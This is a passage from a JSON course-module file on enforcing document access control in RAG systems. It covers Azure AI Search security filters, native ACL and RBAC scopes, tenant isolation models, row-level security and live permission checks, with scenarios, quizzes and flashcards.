groups."},{"name":"Intersect the caller's groups with the set of principals that appear on documents, and send that set by POST","verdict":"best","why":"Groups no document references cannot grant access, so the filter shrinks to what matters. This is design reasoning, not a vendor feature.","tradeoff":"You maintain the principal set at ingest and refresh it when new principals appear."},{"name":"Send all 3,000 ids by POST","verdict":"good","why":"The docs report sub-second results with hundreds or thousands of values [[r14]].","tradeoff":"Latency still grows with count and payload size."}],"flips":[{"if":"Most callers hold under 50 groups","then":"Send the full list by POST and skip the intersection."},{"if":"Access can be expressed as a few roles","then":"Use role claims and shrink the filter further."}],"takeaway":"Shrink the filter to principals that appear on documents."},{"id":"w07-t08-s3","title":"Public documents and failed ACL capture","situation":"Some documents are readable by everyone and others by groups. A connector sometimes fails to read a file's permissions and writes an empty list. The team treats an empty list as public.","constraints":["Mixed public and restricted content","Connector can fail silently","Revocation within hours"],"unknowns":["How often does ACL capture fail?","Is there an alert on empty ACLs?"],"question":"How do you change the design?","options":[{"name":"Keep empty as public and alert on empty lists","verdict":"poor","why":"An unnoticed failure publishes restricted documents in the meantime.","tradeoff":"Acceptable only when every document is public by design."},{"name":"Write an explicit public marker for public documents, treat empty as nobody and quarantine unknown ACLs","verdict":"best","why":"A failed capture hides the document instead of publishing it.","tradeoff":"Failures cause missing results until fixed, so alert on quarantined counts."},{"name":"Re-read permissions from the source on every query","verdict":"good","why":"Always accurate.","tradeoff":"Adds latency and source load and discards the point of the index filter."}],"flips":[{"if":"Most documents are public","then":"Keep the marker and add a cheap per-hit check for the restricted minority."},{"if":"Revocation tightens to minutes","then":"Push ACL merges on change events."}],"takeaway":"Fail closed: empty means nobody."}],"quiz":[{"id":"w07-t08-q1","type":"single","tag":"security","q":"Setting retrievable to false on the ACL field gives which protection?","options":["Field-level security: callers cannot filter on it","It hides the field from responses only. The filter is the control","It encrypts the stored principal ids","It makes the field read-only"],"answer":1,"explain":"retrievable: false keeps the field out of search results. Filtering still works, and it is not field-level security. It does not encrypt or make anything read-only.","ref":"r13"},{"id":"w07-t08-q2","type":"multi","tag":"concept","q":"Which statements about the security filter pattern are correct? Choose all that apply.","options":["It works with any API version","It authenticates the caller","The ACL field can be updated with merge or mergeOrUpload","The filter is applied before ranking"],"answers":[0,2,3],"explain":"The pattern is API-agnostic, ACLs can be patched with merge actions and the filter runs before ranking. It does not authenticate anyone: your code must derive the principal from a validated token.","ref":"r13"}],"flashcards":[{"front":"Which field settings does a security filter use in Azure AI Search?","back":"A Collection(Edm.String) field with filterable true and retrievable false. retrievable false hides it from responses but is not field-level security."},{"front":"Does the security filter pattern authenticate users?","back":"No. The principal is only a string. Your code must validate the token, resolve identities and build the filter on the server."},{"front":"Why store an explicit public marker?","back":"If empty means public, a failed ACL capture publishes a restricted document. With empty meaning nobody, the failure hides it instead."}],"related":["w07-t06","w07-t07","w07-t11","w07-t14","w07-t15","w07-l3"],"refs":["r11","r13","r14","r20","tr19"]},{"id":"w07-t09","order":9,"group":"Access control options","title":"Tenant and user isolation: index per tenant, shared index, per-user namespaces","minutes":9,"difficulty":"core","summary":"Isolation can be physical (a service, index or namespace per tenant or user) or logical (a shared store with a mandatory filter). The choice depends on tenant count, size skew, contracts and service limits.","useIf":"Tenants or users must not see each other's data and you must choose the boundary: service, index, namespace or filter.","avoidIf":"Your question is who can read which document inside one tenant. That is the ACL options, not tenancy.","explain":[{"t":"p","md":"Azure AI Search documents three multitenant models: **one index per tenant, one service per tenant, or a mix** where big tenants get their own service [[r21]]. The Azure Architecture Center adds the trade-off for RAG: store-per-tenant gives data and performance isolation but costs more and can hit service limits, so avoid it for many small tenants. A shared store is cheaper but needs a tenant discriminator and a user-level filter on **every** retrieval, including those inside an agent loop, behind an API layer that other code cannot bypass [[r22]]."},{"t":"table","caption":"Isolation models compared (limits checked 2026-10-13)","head":["Model","Isolation","Offboarding","Limit or cost"],"rows":[["Service per tenant","Highest","Delete the service","Highest cost and operations [[r21]]"],["Index per tenant","Strong, shared service resources","Delete the index","Indexes per service: S1 50, S2 and S3 200, S3 HD 1,000 per partition or 3,000 per service [[r20]]"],["Shared index and tenant filter","Logical, depends on one filter","Delete by tenant id","A missed filter exposes all tenants"],["Namespace per tenant (Pinecone)","Physical per the vendor, no noisy neighbours","Delete the namespace","100 (Starter) to 1,000,000 (Enterprise) per serverless index [[r34]]"],["Partition key per tenant (Cosmos DB)","Data layout, not authorization","Delete the partition data","20 GB per logical partition, relaxed by hierarchical keys [[r33]]"],["Row-level security (SQL, PostgreSQL)","Database enforced predicates","Delete rows","Needs a design around it. The Architecture Center says it is not typically used in multitenant RAG [[r22]]"]]},{"t":"p","md":"Two details decide whether a model actually isolates. In SQL Server and Azure SQL, a shared application login must set the user in `SESSION_CONTEXT`, or the predicate sees only the service identity [[r31]]. In PostgreSQL, superusers and roles with `BYPASSRLS` always bypass policies, and table owners bypass them unless `FORCE ROW LEVEL SECURITY` is set [[r32]]. Managed vector stores that take a caller-supplied filter, such as the `attribute_filter` on OpenAI vector stores, need the filter derived server side [[tr12]]."},{"t":"callout","kind":"note","title":"Vendor claim, label it","md":"Pinecone states that query cost follows namespace size, so metadata filtering in one large namespace costs more than separate namespaces [[r34]]. Treat it as the vendor's claim and test it on your data."}],"whereToUse":["SaaS RAG products with many customers and a contractual separation requirement","Personal assistants where each user owns private documents","Regulated customers that need separate keys, audit boundaries or deletion dates","Platforms where one tenant is far larger than the rest"],"whenToUse":{"use":["Tenant count and sizes are known and skewed or uniform","Contracts state logical or physical separation","You can route every query through one gateway"],"avoid":["An index per user when users number in the thousands, because of index caps","Treating a partition key as an access control","A shared index without a gateway that injects the filter"],"flips":["Tenants grow from dozens to thousands: move from index per tenant to a shared index with a mandatory filter","One tenant becomes 100 times larger: give it a dedicated index or service","A contract demands physical separation: shared indexes are out"]},"alternatives":{"title":"Choosing the boundary","head":["Boundary","Wins when","Loses when","Cost or risk"],"rows":[["Service per tenant","A few large, regulated tenants","Hundreds of tenants","Highest cost, operations load"],["Index per tenant","Tens to hundreds of tenants, per-tenant lifecycle","Thousands of tenants over service caps","Shared resources, noisy neighbours"],["Shared index and filter","Thousands of small tenants","Contracts require physical separation","One bug exposes every tenant"],["Namespace per tenant or user","Store supports millions of namespaces","Store has low namespace caps","Vendor lock-in, vendor-specific limits"],["Row-level security","Documents already live in SQL or PostgreSQL","Documents live in a search index","Bypass rules and shared logins weaken it"]]},"pitfalls":[{"symptom":"Tenants see each other's rows in PostgreSQL despite RLS","cause":"The app connects as the table owner or a BYPASSRLS role","fix":"Use a non-owner role, or set FORCE ROW LEVEL SECURITY, and test as an ordinary tenant"},{"symptom":"RLS in Azure SQL filters on the service account only","cause":"A shared login hides the end user from the database","fix":"Set the user in SESSION_CONTEXT on every connection and use it in the predicate"},{"symptom":"Provisioning fails at tenant number 201","cause":"Index per tenant hit the service index cap","fix":"Check caps early, use S3 HD where suitable, or move small tenants to a shared index"},{"symptom":"One tenant slows everyone","cause":"A noisy neighbour on a shared index","fix":"Move the large tenant to a dedicated index or service"}],"scenarios":[{"id":"w07-t09-s1","title":"Private notes for 200,000 users","situation":"A personal assistant lets each of 200,000 users search their own notes, about 100 documents each. Cost per user must stay low and a user can delete their data at any time.","constraints":["200,000 principals","Tiny data per user","Per-user deletion"],"unknowns":["Is physical separation a requirement?","Does the vector store support very large namespace counts?"],"question":"Which boundary do you choose?","options":[{"name":"Index per user","verdict":"poor","why":"Index caps (200 on S2 and S3, 3,000 per service on S3 HD) rule it out and cost would be huge [[r20]].","tradeoff":"Only works for a handful of principals."},{"name":"Namespace per user in a store built for millions of namespaces","verdict":"good","why":"Physical separation and deletion by dropping the namespace [[r34]].","tradeoff":"Vendor-specific limits and a second data platform."},{"name":"Shared index with a mandatory user_id filter injected by a gateway","verdict":"best","why":"It scales to hundreds of thousands of users at low cost and deletion is a delete by user id.","tradeoff":"One missed filter exposes users, so route all access through the gateway and test with a canary user."}],"flips":[{"if":"Contracts require physical separation per user","then":"Namespaces or separate stores become mandatory."},{"if":"Users number only a few hundred","then":"Index per user becomes feasible and simple."}],"takeaway":"Per-user data at scale favours a shared store with an enforced filter."},{"id":"w07-t09-s2","title":"One tenant is 100 times larger","situation":"A platform has 600 tenants. One accounts for most of the traffic and 100 times the data of the median. Others complain about latency spikes during its ingestion.","constraints":["600 tenants","Heavily skewed sizes","Noisy neighbour"],"unknowns":["Does the large tenant need its own keys or SLA?","Can the router send traffic by tenant?"],"question":"What do you change?","options":[{"name":"A dedicated index or service for the large tenant, shared infrastructure for the rest","verdict":"best","why":"It is the documented mix and removes the neighbour without 600 indexes [[r21]].","tradeoff":"Two operating models and routing by tenant."},{"name":"Add replicas to the shared index","verdict":"good","why":"Absorbs query load.","tradeoff":"Everyone pays for the large tenant, and ingestion contention remains."},{"name":"A separate service for every tenant","verdict":"poor","why":"Six hundred services multiply cost for no benefit to small tenants.","tradeoff":"Right when every tenant is large and regulated."}],"flips":[{"if":"Several tenants become large","then":"Give each its own index or service on a size threshold."},{"if":"The noise is only at ingest time","then":"Schedule or throttle its ingestion first."}],"takeaway":"Skewed tenants call for a mix, not one model for all."},{"id":"w07-t09-s3","title":"Documents already in a relational database","situation":"Customer case notes live in Azure SQL. The app uses one shared login. Tenants must never see each other's rows, and the team wants the database to enforce it.","constraints":["Data in Azure SQL","Shared application login","Database-enforced isolation"],"unknowns":["Can the app set a per-request context?","Do admins need to bypass for support?"],"question":"How do you enforce tenant isolation?","options":[{"name":"Enable row-level security and rely on the shared login","verdict":"poor","why":"Without the user in the context, the predicate cannot tell tenants apart.","tradeoff":"Fine only when each tenant has its own database user."},{"name":"Row-level security with the tenant set in SESSION_CONTEXT on every request","verdict":"best","why":"The predicate then filters every read, update and delete for that tenant [[r31]].","tradeoff":"Needs disciplined connection handling and tests for pooled connections."},{"name":"Copy the data to a search index with a security filter","verdict":"good","why":"Enables vector search with filtering before ranking.","tradeoff":"A second copy to sync and delete, and two places to get permissions wrong."}],"flips":[{"if":"Search over text needs vectors","then":"Index a copy with a tenant filter and keep SQL as the source of truth."},{"if":"Each tenant already has its own database user","then":"RLS can key on the user directly."}],"takeaway":"Database isolation works only when the database can see the tenant."},{"id":"w07-t09-s4","title":"Managed file search with caller-supplied filters","situation":"A team uses a managed vector store whose search takes an attribute filter from the request. Their browser app currently sends the filter with the tenant attribute it was given at login.","constraints":["Managed vector store","Filter supplied with the request","Browser holds the filter"],"unknowns":["Who builds the request today?","Is there a backend in the call path?"],"question":"How do you make this safe?","options":[{"name":"Build the filter on the server from the authenticated session, and never accept it from the client","verdict":"best","why":"The managed store trusts whatever filter arrives, so the server must own it [[tr12]].","tradeoff":"An extra backend hop and less client flexibility."},{"name":"Sign the filter in the browser with a key shipped to the client","verdict":"poor","why":"Anything in the client can be extracted and replayed.","tradeoff":"Signing works when the signer is a trusted server."},{"name":"Create a separate store per tenant and still let the client send filters","verdict":"good","why":"Cross-tenant leaks need a wrong store id, not only a wrong filter.","tradeoff":"More stores to manage, and in-tenant filters stay client controlled."}],"flips":[{"if":"Tenants have contractual separation","then":"Use a store per tenant in addition to server-built filters."},{"if":"Per-user rules apply inside a tenant","then":"Derive those attributes server side too."}],"takeaway":"The caller never supplies an authorization filter."}],"quiz":[{"id":"w07-t09-q1","type":"single","tag":"bug","q":"A PostgreSQL table has row level security enabled and a policy per tenant. The app connects as the table owner and tenants see each other's rows. What is the cause?","options":["Policies are combined with AND by default","Table owners bypass row security unless FORCE ROW LEVEL SECURITY is set","RLS only works for INSERT statements","Row security needs an index on the tenant column"],"answer":1,"explain":"PostgreSQL exempts table owners, superusers and BYPASSRLS roles from policies unless the table is forced. Permissive policies combine with OR, RLS covers reads too, and indexing is a performance concern only.","ref":"r32"},{"id":"w07-t09-q2","type":"multi","tag":"tradeoff","q":"Which statements are supported by the sources? Choose all that apply.","options":["A Cosmos DB partition key is a data layout choice, not an authorization control","Deleting the namespace is the documented offboarding path for a Pinecone namespace per tenant","Azure AI Search S1 allows 1,000 indexes per service","The Architecture Center says RLS is typically the main approach for multitenant RAG"],"answers":[0,1],"explain":"The Cosmos DB page presents partition keys as layout, and Pinecone documents offboarding by deleting the namespace. S1 allows 50 indexes, and the Architecture Center says RLS is not typically used in multitenant designs.","ref":"r20"}],"flashcards":[{"front":"What are Azure AI Search's three documented multitenant models?","back":"Index per tenant, service per tenant, or a mix where large tenants get their own service. S3 HD targets many small indexes."},{"front":"How many indexes can an S3 HD service hold?","back":"1,000 per partition or 3,000 per service. S1 allows 50, and S2 and S3 allow 200."},{"front":"What two RLS traps appear in SQL Server and PostgreSQL?","back":"A shared login hides the user unless SESSION_CONTEXT is set (SQL). Owners, superusers and BYPASSRLS roles bypass policies unless the table is forced (PostgreSQL)."},{"front":"Why must the server build the vector store filter?","back":"Managed stores trust the filter in the request. A client-supplied filter lets a caller read another tenant's data."}],"related":["w07-t06","w07-t04","w07-t08","w07-l3","w04-t19"],"refs":["r20","r21","r22","r31","r32","r33","r34","tr12"]},{"id":"w07-t10","order":10,"group":"Access control options","title":"Live source permission checks","minutes":8,"difficulty":"core","summary":"After retrieval, ask the system of record whether this caller may read each candidate right now. It gives the freshest answer, at the price of latency, load and failure handling.","useIf":"Rights are per document or rule-based, change quickly and are owned by another system.","avoidIf":"Query volume is high and the source cannot take a call per hit, or an index-side filter already meets the revocation target.","explain":[{"t":"p","md":"A live check treats the index ACL as a hint and the **source of truth as the decision**. The usual shape is a pre-filter that returns a short candidate list, then parallel permission calls for only the top hits, with a deadline and a fail-closed rule. Checking every candidate is rarely affordable, and checking only the hits the user will see is usually enough."},{"t":"diagram","id":"w07-t10-d1","title":"Pre-filter, then parallel live checks","alt":"A query is pre-filtered to a short candidate list. The top hits are checked in parallel at the source with a deadline. Allowed hits are kept, spare candidates refill gaps, and the result goes to the prompt.","src":"flowchart LR\n  Q[Query] --> F[(Pre-filter top 20)]\n  F --> C[Parallel live checks on top hits]\n  C --> K[Keep allowed, refill from spares]\n  K --> P[Prompt]\n  C -. timeout .-> D[Drop hit, fail closed]"},{"t":"formula","title":"Latency of the checks","expr":"parallel: max(t_i), capped by the deadline. sequential: sum(t_i)","vars":[{"k":"t_i","v":"latency of the permission call for hit i"}],"example":"Ten checks of 80 ms each cost about 80 ms plus tail when run in parallel and 800 ms when run one after another. Always set a per-call and an overall deadline."},{"t":"p","md":"Three design choices matter. First, **cache decisions** by principal and document with a TTL shorter than the revocation target, because the TTL is part of your SLA. Second, **fail closed**: if a check times out, hide the document. Azure AI Search's native ACL enforcement does this too: when Microsoft Graph is unavailable it returns a 5xx and no partially filtered result [[r12]]. Third, **delegation** is the cousin of this pattern: the Microsoft 365 Copilot Retrieval API preserves permissions without copying data, but limits calls to 200 per user per hour and 25 results [[r26]]."},{"t":"callout","kind":"note","title":"Change feeds are not a live check","md":"Microsoft Graph driveItem notifications average under one minute but can take up to six hours, and directory subscriptions expire in under 29 days [[r27]]. Do not promise a revocation SLA tighter than the feed you depend on."}],"whereToUse":["Restricted tiers where a revoked grant must stop working in seconds","Sources with deny rules, sharing links or guests that cannot be copied into an index","A second line of defence on the top hits after an index pre-filter","Systems where an internal policy service already answers can-this-user-read-this"],"whenToUse":{"use":["Revocation targets are seconds to a minute","Rules are richer than allow lists","Few hits per answer need checking"],"avoid":["Checking hundreds of candidates serially","Sources with strict per-user rate limits and no caching","Failing open to protect availability for restricted data"],"flips":["Revocation relaxes to hours: drop the live check and rely on the pre-filter","The source gives a retrieval API that honours permissions: delegate instead of checking","Query volume grows 10 times: add a short-TTL decision cache and a circuit breaker"]},"alternatives":{"title":"Compared with its neighbours","head":["Option","Wins when","Loses when","Cost or risk"],"rows":[["Live check on top hits","Rich rules, seconds-level revocation","Source cannot take the load","Latency tail, outage handling"],["Pre-filter only","Group rules, lag acceptable","Seconds-level revocation","Stale grants until sync"],["Delegate retrieval to the source","Content lives in a permission-aware store","You need your own ranking","Quotas, licensing, less control"],["Decision cache with short TTL","Repeated hits, quota pressure","TTL longer than the revocation target","Stale decisions up to the TTL"]]},"pitfalls":[{"symptom":"Answers get slower as users cite more documents","cause":"Checks run one by one","fix":"Run them in parallel with a per-call and an overall deadline"},{"symptom":"A source outage exposes restricted documents","cause":"The code fails open on timeout","fix":"Fail closed for restricted tiers and alert on timeout rates"},{"symptom":"Users are throttled by the source","cause":"Every hit triggers a fresh call","fix":"Cache decisions for a TTL shorter than the SLA and batch where the API allows"}],"scenarios":[{"id":"w07-t10-s1","title":"Tight latency budget, fast source","situation":"Retrieval has 300 ms in total. The permission API answers in about 100 ms at the median and 150 ms at p95. Answers use up to five documents, and a revoked grant must stop working within seconds.","constraints":["300 ms retrieval budget","Source p95 150 ms","Revocation within seconds"],"unknowns":["What is the source's rate limit?","What happens when a hit is dropped?"],"question":"How do you add the live check?","options":[{"name":"Check about 50 candidates one by one","verdict":"poor","why":"Fifty serial calls cost seconds and break the budget.","tradeoff":"Only plausible for batch jobs with no latency target."},{"name":"Pre-filter to 20, check the top 5 in parallel with a 120 ms deadline, refill from spares and fail closed on timeout","verdict":"best","why":"Parallel calls cost about one call plus tail and fit the budget.","tradeoff":"A slow source hides some documents, so track the timeout rate."},{"name":"Check only the single top hit","verdict":"good","why":"Cheapest.","tradeoff":"The other cited documents are unchecked, so revocation is stale for them."}],"flips":[{"if":"The source p95 rises to 400 ms","then":"Delegate or shorten the live set and lean on the pre-filter."},{"if":"Revocation relaxes to minutes","then":"A short-TTL decision cache can replace many calls."}],"takeaway":"Check few hits, in parallel, with a deadline."},{"id":"w07-t10-s2","title":"Source quota of 200 requests per user per hour","situation":"The source API allows 200 permission calls per user per hour. Heavy users run 60 queries an hour and each cites eight documents. Restricted content needs revocation within a minute.","constraints":["200 calls per user per hour","480 checks per heavy user per hour","Revocation within a minute"],"unknowns":["Do the same documents recur across queries?","Is a batch check available?"],"question":"How do you stay under quota?","options":[{"name":"Cache decisions per principal and document for 60 seconds, and check only top hits","verdict":"best","why":"Recurring hits reuse a decision, and the TTL fits the one-minute target.","tradeoff":"Up to a minute of staleness and a cache to scope and test."},{"name":"Cache decisions for 24 hours","verdict":"poor","why":"A day-old decision defeats a one-minute revocation target.","tradeoff":"Fine for general content with a daily SLA."},{"name":"Use one broad service identity to check on behalf of all users","verdict":"good","why":"Avoids per-user quota.","tradeoff":"The check then runs under the service's rights unless it asks about the user explicitly, which risks a confused deputy."}],"flips":[{"if":"A batch permission API exists","then":"Batch the top hits in one call."},{"if":"Quota is lifted","then":"Drop the cache and check live."}],"takeaway":"A cache TTL is part of the revocation SLA."},{"id":"w07-t10-s3","title":"The policy service times out","situation":"An internal policy service times out on about 2% of calls during peak. The assistant serves a restricted tier and a general tier. Product wants high availability.","constraints":["2% timeouts","Two sensitivity tiers","Availability goal"],"unknowns":["What does a timeout cost the user?","Is the index ACL fresh enough for the general tier?"],"question":"What do you do on timeout?","options":[{"name":"Fail closed on the restricted tier, tell the user some sources were unavailable, and fall back to the index ACL on the general tier","verdict":"best","why":"It protects restricted data and keeps general answers flowing.","tradeoff":"Restricted answers are sometimes incomplete."},{"name":"Fail open for all tiers to protect availability","verdict":"poor","why":"An outage then exposes restricted documents.","tradeoff":"Defensible only for public content."},{"name":"Fail closed for all tiers","verdict":"good","why":"Safe.","tradeoff":"Needless loss of general answers during timeouts."}],"flips":[{"if":"Timeouts exceed a few percent for minutes","then":"Open a circuit breaker and serve the restricted tier from cache or decline."},{"if":"The general tier is also sensitive","then":"Treat it as restricted."}],"takeaway":"Decide fail-open or fail-closed per tier before the outage."}],"quiz":[{"id":"w07-t10-q1","type":"numeric","tag":"numeric","q":"Ten permission checks each take 80 ms and you run them one after another. How many milliseconds do they add?","answer":800,"tolerancePct":5,"unit":"ms","hint":"Sequential latency is the sum","explain":"Ten times 80 ms is 800 ms. In parallel the cost is about the slowest call plus tail, around 80 ms, which is why checks should run concurrently with a deadline.","ref":"r26"},{"id":"w07-t10-q2","type":"single","tag":"tradeoff","q":"You cache permission decisions to protect a rate-limited source. How long may the TTL be?","options":["As long as needed to stay under the quota","No longer than the revocation target for that tier","Exactly one hour for every tier","Until the document is next re-indexed"],"answer":1,"explain":"The TTL adds staleness on top of everything else, so it must stay inside the revocation target of the tier. Quota pressure, a fixed hour and re-index time are not reasons to exceed it.","ref":"r27"}],"flashcards":[{"front":"What is the usual shape of a live check?","back":"Pre-filter to a short list, check the top hits at the source in parallel with a deadline, refill from spares, and fail closed on timeout."},{"front":"How does Azure AI Search native ACL behave when Graph is down?","back":"It fails closed: the service returns a 5xx and no partially filtered result."},{"front":"Why must a decision cache TTL be shorter than the revocation target?","back":"A cached allow stays valid until it expires, so the TTL is part of the revocation SLA."}],"related":["w07-t06","w07-t08","w07-t12","w07-t15","w07-l3","w07-l6"],"refs":["r12","r26","r27"]},{"id":"w07-t11","order":11,"group":"Access control options","title":"Azure AI Search ACL and RBAC scopes","minutes":10,"difficulty":"advanced","summary":"Preview as of 2026-10-13: permission fields on the index (userIds, groupIds, rbacScope) are enforced at query time from the user's Entra token, with Microsoft Graph expanding group membership.","useIf":"Content is in ADLS Gen2, Blob or SharePoint with Entra identities, preview is acceptable and you want to avoid writing group-expansion code.","avoidIf":"You need GA, a non-Entra identity system, deny rules or revocation faster than your sync can deliver.","explain":[{"t":"callout","kind":"preview","title":"Preview, checked 2026-10-13","md":"Native ACL and RBAC scope enforcement needs a preview REST API or SDK (latest preview `2026-08-01-preview`, latest stable `2026-04-01`) [[r18]]. Preview features carry no SLA and are not recommended for production by the docs [[r11]]."},{"t":"p","md":"The index sets `permissionFilterOption: enabled` and has up to one `filterable` field per permission type: `userIds`, `groupIds` and `rbacScope`. Use Entra object ids (GUIDs), not UPNs or emails. Special values are `\"all\"` for public and `\"none\"` [[r15]]. At query time the app sends the user's Entra token in the `x-ms-query-source-authorization` header. Two checks run: the calling app needs Search Index Data Reader (or Contributor), and the user's `oid` and group ids are matched against document ACLs. A document passes if **any** of userIds, groupIds or rbacScope matches [[r12]]."},{"t":"diagram","id":"w07-t11-d1","title":"Query-time enforcement","alt":"The app sends the query with the user's token. Search asks Microsoft Graph to expand group membership, filters documents by ACL, and returns only permitted results. If Graph is unavailable the service returns an error.","src":"sequenceDiagram\n  participant U as User app\n  participant S as AI Search\n  participant G as Microsoft Graph\n  U->>S: Query plus x-ms-query-source-authorization\n  S->>G: Resolve groups, including nested\n  G-->>S: Membership\n  S-->>U: Permitted results only\n  G--xS: Unavailable gives 5xx, no partial result"},{"t":"stats","items":[{"label":"Values per userIds or groupIds field","value":"1,000","note":"One field per type per index [[r15]]"},{"label":"Distinct rbacScope values per index","value":"5","note":"No limit on documents sharing a value [[r15]]"},{"label":"ADLS Gen2 ACL entries per file","value":"32","note":"Beyond the limit, entries might not be enforced [[r12]]"},{"label":"SharePoint permission entries per file","value":"1,000","note":"Same warning [[r12]]"}]},{"t":"p","md":"Since `2025-11-01-preview`, ACL filters apply even with an API key or admin role, and omitting the token returns only public documents. Earlier previews returned everything, so re-test anything validated on them. To see all documents while debugging, send `x-ms-enable-elevated-read: true` (Search POST only, REST `2026-05-01-preview` or later, needs a role that allows elevated reads) [[r12]]. ACLs list allowed ids only, so there are no deny rules, unlike Graph external item ACLs [[tr14]]."}],"whereToUse":["Pilots and internal tools over ADLS Gen2 or Blob data that carries POSIX-like ACLs","Assistants whose users are all Entra identities with nested group memberships","Teams that want the service, not their own code, to expand groups through Graph","Knowledge sources created with ingestionPermissionOptions in agentic retrieval [[r17]]"],"whenToUse":{"use":["Identities are in Entra and groups nest","A preview with no SLA is acceptable","Allow lists are enough, with no deny rules"],"avoid":["Production workloads that need GA and an SLA","Files with more than 32 ACL entries (ADLS Gen2) or 1,000 (SharePoint)","More than five distinct rbacScope values"],"flips":["GA is required: use security filters and own the group resolution","Revocation must be faster than your sync: push ACL changes or add a live check","Identities are not in Entra: native enforcement does not apply"]},"alternatives":{"title":"Compared with its neighbours","head":["Option","Wins when","Loses when","Cost or risk"],"rows":[["Native ACL and RBAC scopes (preview)","Entra identities, nested groups, lake data","GA needed, non-Entra identity","Preview, no SLA, entry limits"],["Security filters (GA)","Any identity, GA required","You do not want to write group expansion","You own resolution and sync"],["SharePoint indexer ACLs (preview)","Content is in SharePoint","Guests, Anyone links or deny rules","Unsupported link types"],["Delegate to the source","Source has a permission-aware retrieval API","You need your own ranking","Quotas and licensing"]]},"pitfalls":[{"symptom":"Results come back unfiltered for an indexed knowledge source","cause":"The source was created without ingestionPermissionOptions, so no permission metadata exists and the header does nothing","fix":"Set it at creation and test with a revoked canary user [[r17]]"},{"symptom":"A developer with an admin key sees only public documents","cause":"Since 2025-11-01-preview ACL filters apply to keys and admin roles, and a missing token returns public documents only","fix":"Send the user token, or use elevated read for debugging on Search POST"},{"symptom":"Some users miss documents they should see","cause":"The source file has more ACL entries than the limit, so some entries are not enforced","fix":"Flatten to groups at the source and stay under 32 (ADLS Gen2) or 1,000 (SharePoint)"},{"symptom":"A revoked grant keeps working","cause":"The index copy of the ACL is stale, since pull indexers run every 5 to 1,440 minutes","fix":"Push ACL merges on change, or add a live check for restricted hits [[r19]]"}],"scenarios":[{"id":"w07-t11-s1","title":"Internal pilot over a data lake","situation":"A team pilots an assistant over ADLS Gen2 files with POSIX-like ACLs. Users are in Entra with deeply nested groups. Preview is acceptable for the pilot and hours of revocation lag are fine.","constraints":["Entra identities, nested groups","Preview acceptable","Revocation within hours"],"unknowns":["Do files stay within 32 ACL entries?","Is the pilot meant to become production?"],"question":"How do you enforce access?","options":[{"name":"Native ACL filters with the user's token in x-ms-query-source-authorization","verdict":"best","why":"Graph expands nested groups at query time, the service fails closed and you write no group code [[r12]].","tradeoff":"Preview, no SLA, and an upgrade path to plan."},{"name":"Security filters with your own Graph membership code","verdict":"good","why":"GA and portable.","tradeoff":"You write and test nested-group expansion and sync."},{"name":"Post-filter each hit with a Graph membership call","verdict":"poor","why":"A small visible fraction starves top-k and adds a call per hit.","tradeoff":"Fine when nearly all documents are visible."}],"flips":[{"if":"The pilot must go to production with an SLA","then":"Move to security filters or accept the preview risk in writing."},{"if":"Files carry more than 32 ACL entries","then":"Flatten groups at the source first."}],"takeaway":"Native ACLs suit Entra-based pilots that can tolerate preview."},{"id":"w07-t11-s2","title":"Production workload with an SLA","situation":"A customer-facing assistant goes live in two months. The business demands a GA, supported feature set. Content sits in Blob storage, users are in Entra, and each holds about 50 groups. Revocation within one hour is fine.","constraints":["GA and SLA required","Entra identities","About 50 groups per user","Revocation within an hour"],"unknowns":["Who owns group resolution code?","Is there a rollback if preview behaviour changes?"],"question":"Which option do you ship?","options":[{"name":"Native ACL filters in production","verdict":"poor","why":"They are preview with no SLA and the docs do not recommend them for production [[r11]].","tradeoff":"A fit for pilots and non-critical tools."},{"name":"Security filters with a group list from the token or Graph, ACLs pushed to the index","verdict":"best","why":"GA on any API version, and 50 groups is a small filter [[r13]].","tradeoff":"You own group resolution and ACL sync."},{"name":"Native ACLs behind a feature flag, with a security-filter fallback","verdict":"good","why":"Lets you adopt native ACLs when they reach GA.","tradeoff":"Two code paths to test, and preview behaviour has already changed (2025-11-01-preview)."}],"flips":[{"if":"Native ACL enforcement reaches GA","then":"Re-evaluate: it removes your expansion code."},{"if":"Users hold thousands of groups","then":"Compress the filter or use roles."}],"takeaway":"An SLA requirement points to the GA pattern."},{"id":"w07-t11-s3","title":"More permissions than the limits allow","situation":"Some files have 60 ACL entries and the corpus has 12 department scopes. The team plans to use ADLS Gen2 ACLs and rbacScope.","constraints":["60 entries on some files","12 department scopes","Native ACL plan"],"unknowns":["Can entries be grouped at the source?","Can scopes be modelled as groups?"],"question":"What do you change?","options":[{"name":"Trust the native ingestion and test later","verdict":"poor","why":"Entries beyond 32 might not be enforced and rbacScope allows five distinct values per index [[r15]] [[r12]].","tradeoff":"Acceptable only if files stay within limits."},{"name":"Replace per-user ACL entries with groups at the source, and model departments as groupIds","verdict":"best","why":"Fewer entries per file, and a groupIds field holds up to 1,000 values, so 12 departments fit.","tradeoff":"Group hygiene work at the source."},{"name":"Fall back to security filters with your own expansion","verdict":"good","why":"No native limits, and you control the sync.","tradeoff":"More code to own."}],"flips":[{"if":"The source cannot be changed","then":"Use security filters and compute principals yourself."},{"if":"Departments fall to five or fewer","then":"rbacScope fits."}],"takeaway":"Check source limits before you commit to native ingestion."},{"id":"w07-t11-s4","title":"Revocation within two minutes","situation":"Security wants a revoked user removed from results within two minutes. Content comes from ADLS Gen2 via an indexer on a schedule, with native ACL fields.","constraints":["Revocation within 2 minutes","Indexer-based ingestion","Native ACL fields"],"unknowns":["Can the source emit change events?","Is a live check on restricted hits acceptable?"],"question":"What do you do?","options":[{"name":"Set the indexer interval to one minute","verdict":"poor","why":"The schedule minimum is 5 minutes, so one minute is not available [[r19]].","tradeoff":"A 5-minute interval fits only targets of five minutes or more."},{"name":"Push ACL merges from change events, plus a live check on restricted hits","verdict":"best","why":"Push lets you update userIds or groupIds immediately with merge, and the check covers gaps [[r19]].","tradeoff":"You own the change feed and the extra call."},{"name":"Indexer every 5 minutes and accept the lag","verdict":"good","why":"Simple and close to target.","tradeoff":"Misses two minutes by design, and token and Graph caches add more."}],"flips":[{"if":"The target relaxes to 15 minutes","then":"A 5-minute indexer is enough."},{"if":"Only a few documents are restricted","then":"Apply the live check to those only."}],"takeaway":"A pull indexer cannot beat its schedule floor."}],"quiz":[{"id":"w07-t11-q1","type":"single","tag":"bug","q":"A developer runs the same query with an admin API key and no user token and sees only a few public documents. On which API versions does this happen and why?","options":["Any version: ACLs never apply to keys","Since 2025-11-01-preview: ACL filters apply even with a key, and no token returns only public documents","Only before 2025-11-01-preview, when keys were blocked","Only on stable 2026-04-01, which blocks previews"],"answer":1,"explain":"From 2025-11-01-preview ACL filters apply to keys and admin roles, and a missing token yields public documents only. Earlier 